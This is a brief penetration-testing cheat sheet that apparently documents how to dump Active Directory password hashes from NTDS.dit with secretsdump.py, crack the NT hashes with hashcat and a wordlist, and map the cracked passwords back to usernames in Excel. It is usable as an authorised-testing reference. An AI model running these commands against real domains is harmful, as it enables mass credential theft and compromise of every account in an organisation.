NTDS.dit - DB used to store AD data including User/Group Info & Password Hashes

Dumping NTDS.dit (run the command against the Domain Controller with a Domain Admin's details):
```bash
secretsdump.py [DOMAIN]/[USERNAME]:'[PASSWORD]'@[IP_ADDRESS] -just-dc-ntlm
```
Grab the NT to crack:

![image](https://github.com/user-attachments/assets/07b7e977-4a39-43a0-9c59-9242457cefc9)

# Crack all NTDS.dit NT hashes
* Copy the full NTDS.dit and paste it all into excel.
* In excel, goto Data > Text to Columns > Delimited > Next > Delimiters - Other: ":" > Next > Finish.
* This will split the NTDS.dit into the following columns: Users, rID, LM hash, NT hash
* Copy all the NT hashes.
* Create a file with all the hashes pasted.
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --show
```
* Copy the output and paste it on a new excel sheet. 
* Highlight the cracked passwords column, then select Home > Numbers > Dropdown menu that says "General", and change it to "Text".
* Go back to the first sheet (that stores the full NTDS.dit) and select the first box in the next column.
* Type into the box "=vlookup([CLICK A HASH VALUE], [CLICK BOTH COLUMNS ON THE OTHER EXCEL SHEET], 2, false" 
* Double click the corner of the vlookup box so that it looks up all the hashes.
